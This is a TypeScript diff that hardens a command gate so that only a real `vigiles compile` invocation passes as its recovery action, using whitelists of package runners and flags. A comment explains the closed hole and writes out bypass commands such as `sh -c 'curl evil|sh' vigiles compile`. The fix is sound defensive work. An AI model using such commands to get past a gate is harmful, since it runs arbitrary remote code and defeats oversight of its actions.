@@ -1138,10 +1138,85 @@ function isNeutralLeaf(leaf: NormalizedLeaf): boolean {
   return leaf.argv[0] === "cd";
 }
 
-/** A leaf invoking `vigiles … compile`, however it is launched. */
+/**
+ * Package runners that launch a package's binary, as the leading words of a
+ * leaf's argv. A whitelist of PREFIXES, matched positionally — the point of the
+ * list is that everything before `vigiles` is accounted for.
+ */
+const RUNNER_PREFIXES: readonly (readonly string[])[] = [
+  ["npx"],
+  ["bunx"],
+  ["npm", "exec"],
+  ["pnpm", "exec"],
+  ["pnpm", "dlx"],
+  ["yarn", "exec"],
+  ["yarn", "dlx"],
+  ["bun", "x"],
+];
+
+/**
+ * Runner options that consume NO following token, so the package name is the
+ * next word. A whitelist, not "skip anything starting with `-`": `npx -c
+ * '<shell>'` runs its value and `npx -p <pkg>` installs one, so a
+ * skip-unknown-flags rule would hand back the hole this closes.
+ */
+const RUNNER_VALUELESS_FLAGS: ReadonlySet<string> = new Set([
+  "-y",
+  "--yes",
+  "--no",
+  "--no-install",
+  "--prefer-offline",
+  "--offline",
+  "--silent",
+  "--quiet",
+]);
+
+/** `vigiles`, `./node_modules/.bin/vigiles`, `vigiles@15.0.2` — the package, however spelled. */
+function isVigilesToken(token: string): boolean {
+  const base = basenameOf(token);
+  const at = base.indexOf("@", 1);
+  return (at === -1 ? base : base.slice(0, at)) === "vigiles";
+}
+
+/**
+ * The argv index at which `vigiles` is the EXECUTABLE BEING INVOKED, or -1.
+ *
+ * 🔴 Positional, and that is the whole point. This used to be a `findIndex` over
+ * the entire argv, so any command carrying the words `vigiles` and `compile`
+ * anywhere in its arguments was accepted as the repair action — `node -e
+ * '<payload>' vigiles compile` and `sh -c 'curl evil|sh' vigiles compile` were
+ * both admitted as ONE recovery leaf, verified 2026-08-11 against the real
+ * runtime. The escape fires exactly when the gate is refusing everything, so
+ * that was arbitrary execution through a fail-closed gate.
+ *
+ * Accepted shapes, and nothing else: `vigiles` as the leaf's own head (through
+ * a path or a `sudo`/`env`/`timeout` wrapper, both already resolved by
+ * `leafCommandsNormalized`), or a known package runner whose own words are
+ * accounted for by {@link RUNNER_PREFIXES} + {@link RUNNER_VALUELESS_FLAGS}.
+ */
+function vigilesExecIndex(argv: readonly string[]): number {
+  const head = argv[0];
+  if (head !== undefined && basenameOf(head) === "vigiles") return 0;
+  for (const prefix of RUNNER_PREFIXES) {
+    if (!prefix.every((word, k) => argv[k] === word)) continue;
+    let i = prefix.length;
+    while (i < argv.length && RUNNER_VALUELESS_FLAGS.has(argv[i])) i++;
+    const token = argv[i];
+    if (token !== undefined && isVigilesToken(token)) return i;
+  }
+  return -1;
+}
+
+/** A leaf invoking `vigiles compile`, however it is launched. */
 function isCompileLeaf(leaf: NormalizedLeaf): boolean {
-  const i = leaf.argv.findIndex((a) => basenameOf(a) === "vigiles");
-  return i !== -1 && leaf.argv.slice(i + 1).includes("compile");
+  const i = vigilesExecIndex(leaf.argv);
+  if (i === -1) return false;
+  // The verb is `args[0]` in the CLI's own dispatch — it takes no global flags
+  // before it — so it is the very next word, modulo the `--` a runner needs to
+  // stop reading its own options (`npm exec vigiles -- compile`).
+  let j = i + 1;
+  while (leaf.argv[j] === "--") j++;
+  return leaf.argv[j] === "compile";
 }
 
 /**
